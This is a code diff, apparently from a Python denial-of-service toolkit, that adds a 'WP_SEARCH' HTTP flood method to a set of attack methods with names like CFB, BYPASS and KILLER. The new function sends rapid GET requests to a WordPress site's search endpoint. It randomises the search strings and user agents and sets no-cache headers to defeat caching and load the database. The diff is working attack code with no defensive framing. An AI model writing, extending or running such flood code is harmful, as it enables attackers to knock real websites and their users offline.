@@ -126,7 +126,7 @@ class Methods:
     LAYER7_METHODS: Set[str] = {
         "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "SLOW_V2", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
-        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
+        "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP", "WP_SEARCH"
     }
 
     LAYER4_AMP: Set[str] = {
@@ -1427,6 +1427,36 @@ class HttpFlood(Thread):
                 except:
                     break
         
+        Tools.safe_close(s)
+
+    def WP_SEARCH(self):
+        # [OPTIMIZED] WordPress Database Stresser
+        # Sends requests to /?s=RANDOM ensuring no cache hit and high DB usage.
+        
+        # Prepare Base Request
+        # Append ?s= or &s= depending on existing query
+        sep = "&" if "?" in self._target.raw_path_qs else "?"
+        
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+             for _ in range(self._rpc):
+                # Generate Random Search Query per Request
+                search_query = ProxyTools.Random.rand_str(randint(5, 15))
+                full_path = f"{self._target.raw_path_qs}{sep}s={search_query}"
+                
+                payload = (f"GET {full_path} HTTP/1.1\r\n"
+                           f"Host: {self._target.authority}\r\n"
+                           f"User-Agent: {randchoice(self._useragents)}\r\n"
+                           f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+                           f"Accept-Language: en-US,en;q=0.5\r\n"
+                           f"Accept-Encoding: gzip, deflate, br\r\n"
+                           f"Connection: keep-alive\r\n"
+                           f"Upgrade-Insecure-Requests: 1\r\n"
+                           f"Cache-Control: no-cache\r\n"
+                           f"Pragma: no-cache\r\n"
+                           f"\r\n").encode("utf-8")
+                
+                Tools.send(s, payload)
         Tools.safe_close(s)
 
 
